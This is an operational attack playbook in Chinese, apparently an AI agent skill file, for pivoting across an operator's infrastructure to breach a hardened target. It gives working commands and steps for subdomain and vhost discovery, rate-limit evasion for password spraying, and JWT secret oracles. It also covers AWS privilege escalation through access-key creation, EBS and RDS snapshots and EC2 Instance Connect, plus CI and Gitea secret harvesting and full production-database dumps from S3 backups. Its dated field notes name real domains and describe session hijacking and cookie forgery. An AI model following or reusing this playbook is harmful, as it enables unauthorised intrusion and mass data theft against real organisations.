---
name: operator-estate-pivoting
description: "Use when a target is hardened: pivot the operator estate."
version: 1.0.0
tags: [pentest, recon, pivot, reverse-ip, credential-reuse, rate-limit]
---

# Operator Estate Pivoting

单个目标打不动（非凭据面测满、无口令、无源码、无注入）时，**不要换同 /24 的机器，也不要死磕主站字典**——沿**运营者身份**扩张：同一个人手里的资产必然共用一套口令/密钥/开发习惯。这套链的落点永远是把从侧翼拿到的**凭据或密钥**拿回点名目标复用，而不是把侧翼站点本身打穿。

## 锁面纪律（先读）

- **用户点名的 host 始终是主线。** 扩张出来的资产默认只算 recon 与「凭据来源」；把头号战果写成侧翼站点的洞、或就此换目标 = 跑偏，用户会当场问「这和我发你的目标有什么关系」。
- 只有当（a）用户目标本身就是「打穿这个运营者」，或（b）用户明文同意扩面时，才把侧翼当主线打。
- 侧翼每发现一个资产立刻落 `state.md`：主机 / 端口 / 指纹 / 口令面结论；主目标行不许被挤掉。

## 程序

### 1. 反向反查所有已知 IP

```bash
curl -s "https://api.hackertarget.com/reverseiplookup/?q=<IP>"
```

对**每一个**已知 IP 都跑（主站源站、CDN 后的真实 IP、任何扫出来的邻机）。同 IP 的其它域名 = 同一运营者资产簇，比 FOFA 直接。

### 2. crt.sh 拿全量子域，并上 DNS 爆破

```bash
curl -s "https://crt.sh/?q=%25.<domain>&output=json" | python3 -c "import sys,json;[print(x['name_value']) for x in json.load(sys.stdin)]" | sort -u
```

CT 记录会包含 DNS 爆破扫不到、已经下线但 **vhost 还在** 的域名。与子域爆破（大字典 + 常见前缀）取并集。

crt.sh 429/超时是常态：换 `api.certspotter.com`（`curl -s "https://api.certspotter.com/v1/issuances?domain=<domain>&include_subdomains=true&expand=dns_names"`）拿同一批 CT 名称，再叠一份自有前缀字典做 DNS 爆破；两路互补，只靠 crt.sh 限速会整轮丢子域，而源站往往就在丢的那批里。

### 3. 死 DNS ≠ 没有站点 —— 全部用 --resolve 复验

```bash
curl -sk -D- --max-time 15 --resolve <host>:443:<IP> "https://<host>/"
curl -s -D- --max-time 15 -H "Host: <host>" "http://<IP>/"
```

域名 `dig` 全 NXDOMAIN 不代表站点不存在：只要反向代理（Caddy/nginx）里还留着它的 vhost，就会照常响应（常见 `301 → https://<host>`）。本类案例里正是这一步，从一个没有任何 DNS 记录的名字里挖出**带独立 `/admin` 后台的全新 App**。判死一个域名前必须打过一发 --resolve。

同理，反向代理上还挂着**根本不在 CT / 字典里**的 vhost（内部管理台、监控盘、旧版前台）。对已确认的源站 IP 用一份前缀字典做 **Host 头枚举**（`admin st monitor zabbix webmail old dev test sale panel portal infra mail` …），逐个 `GET /`：源站 vhost 常常**不在 CDN 后面**，命中即绕开 WAF/限流。判据是与默认 catch-all 不同（标题/状态码/字节数），别把 catch-all 的 301/302 `/index.html` 当成新站。

### 4. 认「同款产品的裸奔实例」

兄弟实例常常**没挂 nginx/WAF/限流**（裸 uvicorn/FastAPI 直接暴露），是全速打点、绕开主站防护的最佳目标。判「同一份镜像」要硬证据，不能靠长相：

- 登录页 HTML **字节数完全一致**（模板没改过）
- `/health` 返回体一致（同一个 handler）
- `/openapi.json` 的 **path 与 schema 名** 一致（同一个代码生成；schema 名里带内部函数名，能反推未列出端点）

命中后：主站被 `401/403/限流` 挡下的那套在兄弟实例上重测一遍——WAF 挡住 ≠ 没有洞。

### 5. 喷之前先测限流的 key（决定要不要喷、怎么喷）

同一 IP 换用户名 / 同一用户名换源 IP，看哪种组合仍被 429：

- 换用户名仍 429 → 按 **IP** 分桶；多源机用 `curl --interface <ip>` 轮换源 IP 是唯一杠杆，XFF/X-Real-IP 头无效。
- 换用户名就放行 → **按用户名分桶**：每个用户名独立额度，「每账号 5 次」的墙于是变成可横扫几百个候选用户名、每个只试少量口令。
- 响应体里的 `retryAfter` / `retry_after` **直接读，不要猜窗口**；面板常递进加长（30s → 1000s+），一被拉长立刻停手转别的面，硬刷只会越封越久。
- nginx 与应用层常常**同时**限流：`429 + HTML` = nginx，`429 + JSON` = 应用层，两层窗口分别测。

宽面扩张时**优先打资产簇里最弱的那一个**（无限流面板 > 单层限流 > 双层限流），而不是把同一份大字典在多个站点上平行灌。

### 6. 默认密钥/口令候选从哪来

按顺序收候选，别只试 `admin123`/`secret`：

1. 开源产品的**源码默认值**（`viper.SetDefault`、`config.*.example`、`.env.example`、`docker-compose.yml`）
2. 社区**一键部署脚本**里的固定值（`change-this-*` 占位、教程里互相 copy 的 secret）
3. 品牌词/域名/产品名 ± 数字（`<brand>123`、`<brand>2026`、`<brand>@123`）——运营者最常这么写
4. 常见弱串

**闭源商业面板：先认产品，这是唯一有效的第五级来源。** 判据：`/openapi.json` 里出现 `clone_contact`/`instances`/`owner_tg_user_id` 这类**代理商**字段、导航是「机器人实例 / 授权用户」、登录页写着「部署前务必改成你自己的强密码」。命中说明运营者只是个**转卖商业产品的代理商**，默认口令只存在于厂商/卖家手里，字典再大也撞不到。此时停止灌字典，转去认产品（厂商 TG 功能频道 → 卖家 → 中文源码站 → GitHub 同族仓库）：拿到源码才有默认值、`SECRET_KEY` 推导方式和真实漏洞面。做法与可用命令见 `references/vendor-product-identification.md`。

### 7. 密钥差分预言机（比喷 secret 快得多）

有 JWT/HMAC 面时，用候选 secret 签一发，看响应落在哪一档：

- `invalid token / 签名无效 / not signed in` → secret 错。
- `token revoked / 登录已失效 / user not found / 会话不存在` → **secret 对了**，只是 DB 记录校验没过，再调 `admin_id`/`sub`/`token_version`/`jti` 对齐。

少了这一步，喷失败会一直显示「全 401」，你会误判成密钥很强而收手。

### 8. 回灌主目标（这才是交付）

侧翼拿到的任何口令、token、secret、session → **立刻回主目标复测**（后台登录 / 签名接口 / 面板）。拿到即交，不攒着写长报告；拿不到也如实说「侧翼测到哪、还差什么」。

### 9. 多轮战役：先复验旧入口，再开支线

同一目标打到第 N 轮时，开局先花在「上轮到底握着什么」上，而不是直接开新面：

1. **逐个复验历史入口**——loot/报告里记的 shell 路径、后台会话、凭据、IDOR 端点，各重打一发。旧 RCE 路径现在 404 / 旧会话失效 = **对方已封堵**，这是本轮该写的结论；别把失效入口当现有能力引用，也别因 404 说「打不动」。
2. **旧入口失效时，重夺同一台机的执行权 ≪ 从零打新站。** 同 IP 的其它服务（另一个 Tomcat、MeshCentral、面板、节点 RPC）优先；那台机上往往同时挂着 DB 连接串、keystore/节点密钥、邮件设施——拿到它整案就通了。
3. **同一个数据源只挖一次。** 一份凭据/私钥库到手后做**一次**穷举推导 + 与全部特权地址全量比对并落盘，命中集合不再变化就停手，转去找「真正会签名的那个服务」的环境，而不是再 dump 一遍同一个库。
4. **报告区分「曾获得」与「现持有」**：失效项标注复验结果，否则用户按旧结论行动必然对不上现实。

### 10. 云账号到手之后的扩张顺序（AWS 实测）

侧翼主机里最值钱的往往不是它的数据，而是它身上的**云凭据**。拿到一把云钥匙后按这个顺序放大，收益比继续打机器高一个数量级：

1. **先枚举自己的权限**，别急着猜。只读 IAM 面常常是开的：`iam get-account-authorization-details` 一把拉全 → 看自己挂在哪个组、组上挂了哪些 `*FullAccess`（实测常见 `AmazonRDSFullAccess` + `AmazonEC2FullAccess`）。
2. **`iam:CreateAccessKey` 是最高频的越权点**：很多受限用户被允许给**别人**造钥匙。对已确认带 `AdministratorAccess` 的目标用户直接 `aws iam create-access-key --user-name <admin>`（注意：每用户上限 2 把，可能要先删自己造的那把；密钥只显示一次 → **重定向到文件**，别打在终端里）。
3. **EBS 快照 + 挂盘 = 对所有机器免 SSH 读全盘**：`create-snapshot <vol>` → `create-volume --availability-zone <该卷所在 AZ>`（**卷只能挂到同 AZ 的实例**）→ 挂到自己开的取证机上 `mount -o ro`。这对「SSH 被源 IP 白名单挡死」的机群是唯一通路。
4. **EC2 Instance Connect = 在任意实例上拿 shell**（有 `ec2-instance-connect:SendSSHPublicKey` 权限即可，且实例装了 agent）：`send-ssh-public-key --instance-id X --availability-zone <AZ> --instance-os-user ec2-user --ssh-public-key "$PUB"`，然后**立刻** SSH（**推送的钥匙只活 60 秒** → 必须 push 与 ssh 放在同一条命令里；否则会看到 `Permission denied (publickey)` 而误判成「没权限」）。配合自己给自己目标安全组加一条 `22 <自己的IP>/32`。
5. **RDS 也能走快照**：给只读副本打快照 → `restore-db-instance-from-db-snapshot` 复原成**自己的实例**（自定 master 口令）→ 全库 dump；被 `FLUSH TABLES`/RELOAD 权限卡就 `--skip-lock-tables --no-tablespaces` 逐表导。
6. **跨账号**：`organizations list-accounts` 能列出同组织成员；成员账号若没有 `OrganizationAccountAccessRole` 就 assume 不进去，别在 org 上耗。真正的隔离线往往是**组织外的第四个账号**——找不到它的钥匙就是硬边界，如实报。

### 11. 代码托管（Gitea/GitLab）库文件 = CI 的钥匙串

拿到运维机整盘后，代码托管的 SQLite/MySQL 库比源码本身值钱。依次掏：

- `action_variable` / `action_run_job.workflow_payload` / `action_task_output` —— CI 的**变量与作业载荷**（kubeconfig、镜像仓库、集群命名空间、`runs-on` 标签常在这里暴露）。
- `secret` 表常是空的（部署凭据反而落在 **runner 本机**的 `~/.kube/config`）——所以「runner 主机」才是目标：用 `action_runner` 里的 `name`/label（如 `ip-172-31-22-14`、`runner-fd-k8s`）反查它属于哪个账号/VPC。
- `access_token` 是哈希、解不回来；但**用户表的口令哈希 + 该运营方自己库里的「哈希→明文」对照表**（实测存在一张 `z_password_hash` 把 md5 与明文一一对应，用于他们自己的内部校验）→ 一次查表把所有管理员口令反出来。**先查这种表，再考虑爆破。**
- 仓库里 `.generated/`、`doc/*.sql`、`deploy/helm/values.yaml`、`scripts/*.sh`（如 `credentials.sh`/`sync_defaults.sh`）是**默认口令与配置路径**的富矿：`values.yaml` 里除了 `namespace: fd-xxx`，还常有 `etcd: 2379` 的账号口令与配置路径（`/shebao/prod`）。
- 运维机整盘上的 `/root/.git-credentials` 与 `/root/.netrc` 是**明文登录**（形如 `https://<user>:<token>@git.<domain>`），拿它进自家 Gitea/GitLab 比从 SQLite 库里解 token 快得多。**token 的 scope 决定能调什么**：`read:repository` 时 `/api/v1/repos/search` 会通而 `/user/repos` 返 403——把 403 当「token 无效」会白丢一条链。仓库清单到手后按库名关键词（`deploy`/`fund`/`<line>`/`admin`）过一遍，**部署仓库永远优先于业务仓库**。

### 12. 「两套网」的识别与取舍

同一个运营方常把业务拆成**互不相通的网**（实测：IM 线全在 AWS 某账号、基金/理财线在**另一个账号 + 中国云 k8s**）。判断方法：把已拿到的每块盘**全盘 grep 目标关键词**（品牌码、域名、库名、`fd-` 前缀）。四块盘 0 命中 = 两条线零交集，**不要再在旧线的机器上找新线的库**，要把力气放到「新线的那一网」：其支撑机（打包/分发/实名/短链）常在**名额外的云账号**里，而它的生产库往往**在集群内**（`<ns>-grafana.sunday1.top` 这类 ingress 说明服务是集群内网暴露）。

判据与陷阱：中国云机群的 NodePort **同时有 HTTP 与 HTTPS**——`HTTP 请求发到 HTTPS 端口` 的 400 很容易被误读成「端口没服务」（实测 38085/62893 全是 HTTPS，改 `https://` + `-k` 后才出内容）；服务全部 nginx 前置时，**etcd/MySQL 不会有 NodePort**，全端口扫完只有 80/443/22 + 若干 HTTPS 端口就是硬边界。

### 13. 部署仓库 → 定时备份桶 = 完整库的终点（不必碰 DB 服务器）

用户点「**我要的是完整数据库**」时，交付物是**库本体或它的全量 dump**——接口逐页抽出来的用户表/关系表再整齐也是子集，会被当场打回。此刻**停止在 API 上逐页收割**，转去找「他们的库是怎么备份的」：运营方的部署仓库（`deploy-base-*`、`k8s/<line>`、`scripts/*`）里每个命名空间一份 `<ns>/config.env`，其中 `<DB>_BACKUP_ENABLED=true` + `_S3_BUCKET/_PREFIX/_ENDPOINT/_ACCESS_KEY/_SECRET_KEY` 常是**明文**。拿这批 AK/SK 直接 `aws s3 ls s3://<bucket>/<ns>/mysql/`：桶里就是按调度落的**全量逐表 dump**，一行生产库都不用碰。

- **判据**：`NAMESPACE=fd-<line>` + `MYSQL_DATABASE='<db>'` + `MYSQL_BACKUP_*` 五件套齐全 → 这一份 config.env 等价于那把库的钥匙。
- 桶里以 `<ns>/` 分库、`<ns>/mysql/` 与 `<ns>/valkey/` 分存储类别，批次是并列前缀（`...every-30-min<stamp>/`）；`sync` 最新批，旧批留作差分。**先列桶根**——同一把密钥常能读同账号全部库/品牌的备份。
- 备份桶不受「生产库在中国云、境外出口打不动」那层限制，所以它排在**直连生产 mysqld 之前**。
- 变量族、dump 文件布局与还原顺序、覆盖率口径见 `references/database-backup-harvest.md`。

### 14. 备份桶只到「上一批」——线上实时读走运营方自己的 Web DB 管理器

备份桶给的是**上一批快照**，用户必追问「这是最新的库吗」。同一份 `<ns>/config.env` / `manage.py` 里通常还写着 `DBX_HOST`（`dbx-<ns>.<域名>`）= 运营方自己部署的**网页版数据库管理器（DBX 类自托管 Web SQL 客户端）**，而 `manage.py` 常把 `DBX_PASSWORD` 直接赋成同一个共享口令 ⇒ 它有**公网 HTTPS 入口**，MySQL 没有 NodePort 也照样能读线上库。

流程：`POST /api/auth/login {"password":"<共享口令>"}` → `{"ok":true}` → `GET /api/connection/list`（**连同口令**返回主库/从库/valkey/etcd 连接串）→ `POST /api/query/execute {"connectionId":..,"database":..,"sql":..}` 在**线上生产库**跑只读 SQL。

- 三个坑：payload **必须带 `database`**（缺了 422 `missing field \`database\``）；字段名是 **camelCase `connectionId`**；**会话 cookie 是 HttpOnly**，Python `http.cookiejar` 静默丢掉 `#HttpOnly_` 行 → 401，**必须用 curl `-b jar` 驱动**。
- 端点探活：`405`=存在但方法不对、`422`=字段缺失（都说明端点活着）、`404`=没有。
- 只跑只读 SQL（`SHOW DATABASES` / `COUNT(*)` / `MAX(created_at)`），写面不碰。
- 这条通道同时是「**是不是最新**」的判据来源与「线上领先多少」的量尺，见参考文件 §5–§7。

## Pitfalls

- **不要越锁面。** 同 /24 的另一个 A 记录、只因「看着像一家人」就开打另一套产品 = 跑偏；扩张必须能画出「同一运营者」的证据链（同域名 / 同 IP / 同开发者指纹 / 同 TG 号）。
- **存在性/校验码预言机不是漏洞**（`404 群不存在` vs `403 签名无效`、`missing_hash` vs `invalid_hash`、`not_found` vs `wrong_password`）。写 Deadends，别进高危表充数。
- **Telegram Mini App 的 initData** 由客户端提供，但服务端必须用它**自己的** bot_token 算 HMAC。按 `missing_init_data_or_bot_token` → `missing_hash` → `invalid_hash` 逐级触发确认校验存在后，再试把 `bot_token` 放 query/header/body 想让服务端改用你的密钥——仍 `invalid_hash` 就停手，别在伪造 initData 上耗。
- **DNS 反查拿到的域名要 --resolve 复验**（见 §3）：直接对域名发请求会因 NXDOMAIN 得出「站点不存在」的错误结论。
- 侧翼站点打到的东西**不要当成对主目标的战果**上报；每条结论标明它属于哪个 host。
- **代理商 SaaS 面板不存在「埋在字典里」的默认口令。** 厂家发给代理商的产品，管理员是**交互式创建**的（`python -m src.create_admin` 一类脚本，无默认值），运营者必然自设强口令；面板自己的「新增管理员」接口 body 里往往**连 password 字段都没有**（管理员只挂 TG id）。这类目标上百万级字典不是「迟早能中」，而是结构性无解——灌够一轮确认完限流面（IP 桶 / 用户名桶 / 双层）就停手，转产品身份与侧翼凭据，否则会把整场时间烧在一个不存在的解上。
- **同一台机器上只让一个「吃 CPU」的重活当主角。** bcrypt/argon2 口令喷（数百并发）会把**同机**其它攻击面一起拖慢（实测同机 SSH 从 455 次/分掉到 26 次/分）；任何向量突然变慢，先怀疑自己把它压住了，再怀疑「被封了」。凭据面编排（开工前三问、多出口 IP 轮转、paramiko 判别式 SSH 爆破 > hydra、不确定结果必须重试、控制面 API 优先、`pkill` 自杀）：`references/credential-attack-orchestration.md`。
- **动手挂盘/建卷前先确认真实宿主。** 交互 shell 所在的机器 ≠ 你以为是的那台云实例（实测落在**一台境外 VPS** 上，卷却建给了另一个账号里的审计机）。先 `hostname` + `ip -4 -o addr`，再拿该私网 IP 去 API 里对齐实例 ID；**别把 IMDS 当唯一依据**（`curl 169.254.169.254` 可能直接挂住超时）。定卷、挂载、翻盘都只在确认过的那台机上做。
- **取 root 文件用 `ssh <host> 'sudo cat <file>' > 本地文件`，不要 scp、不要 tar 到 /tmp。** scp 读不了 root-only 文件；取证机的 `/tmp` 常是小 tmpfs，`tar czf /tmp/x.tgz` 会**静默产出 0 字节包**。每次取完**校验字节数**：0 字节 = 没取到，换 `sudo cat` 流式落盘。
- **attach 的设备名会被占用，Nitro 实例上真实节点是 `/dev/nvmeNn1p1`。** 请求 `/dev/sdX` 报 in-use 或 mapping 为 `None` 时别逐个试名——建完卷后 `lsblk` 找新增的那块盘再 `mount -o ro`。
- **CI 的加密凭据库不要先啃。** `credentials.xml` + `secrets/master.key` + `hudson.util.Secret` 的格式随版本变（实测 key 可能是 256 hex 字符而非标准 32），解不出就整条链停摆。**先把 Jenkins workspace / 各仓库里的部署 env、`.env`、构建日志 grep 一遍**——真口令常以明文躺在 deploy 脚本里；加密库是最后手段。

## 验证清单

- [ ] 每个已知 IP 都跑过反向反查，资产清单落盘
- [ ] CT + 子域爆破并集，域名全部 --resolve 复验过
- [ ] 同款产品兄弟实例逐一比对指纹（字节数 / health / openapi）
- [ ] 喷之前限流 key 已测（IP / 用户名 / 双层）
- [ ] 候选密钥/口令来自 §6 的四级来源，不是只有常见弱串
- [ ] JWT 面做过「签名过 / 记录没过」的差分
- [ ] 侧翼所得凭据已回灌主目标
- [ ] 用户要「完整库」时，已枚举定时备份桶 / 云盘快照 / RDS 快照 / 数据盘，而不是只交接口子集；交付前报出**表数与行数的覆盖率与缺口**

## 参考

- `references/estate-service-catalog.md` — 「号商 + 支付 + 发卡 + 云控」集团典型组件、各面板探测入口与报错指纹、克隆实例比对表、从 API 契约里挖运营者身份
- `references/vendor-product-identification.md` — 黑盒后台 → 认商业产品 → 厂商/卖家：可直接跑的命令（TG 频道预览、GitHub 仓库搜索、中文搜索选路）与源码到手后看什么
- `references/credential-attack-orchestration.md` — 凭据面编排：开工前三问（密码认证是否开 / 版本 CVE / 字典路径）、多出口 IP 轮转、paramiko 判别式 SSH 爆破 vs hydra 监控坑、同宿主 CPU 竞争、进程自杀与回报口径
- `references/database-backup-harvest.md` — 「完整数据库」的四类落点（定时备份桶 / 云盘快照 / 托管 DB 快照 / CSI+etcd）：备份变量族、桶前缀与批次枚举、dump 文件布局与还原顺序、**Web DB 管理器(DBX)实时通道**、**dumpInstance 还原三规矩**、**「这是最新的库吗」取证模板**、覆盖率口径

## 运营方前端账号 + 在线会话文件（2026-09 Lucky162 实战）
- 运营方后台 `ly_users` 表是「人」的入口；更重要的是 server 上的 **session 文件实时可读**（`/var/lib/php/sessions/sess_*`）
- 读当前在线运营者的 session → 直接冒用其后台会话（不用破密码）
- 同源兄弟站判定：`preexpert.top` 家族同一 origin/同一套代码 → 一次拿下多品牌
- 判据：session 文件 mtime 在最近 10 分钟 + 对应 `ly_users` 在线状态

## Discuz authcode 解密 + 会话文件（2026-09 Lucky162 实战）
- 运营方自研站用 Discuz `authcode` 加密 cookie，密钥硬编码在 `application/common.php`：`KEY='AC_KEY'`
- 解密脚本：`authcode($str,'DECODE','AC_KEY')` → 拿到 `uid/username` → 直接伪造登录态
- 服务器上 `/var/lib/php/sessions/sess_*` 实时可读，配合 `ly_users` 表定位在线运营者
- 判据：解密出的 uid 与 `ly_users` 匹配 + 会话文件 mtime 在 10 分钟内
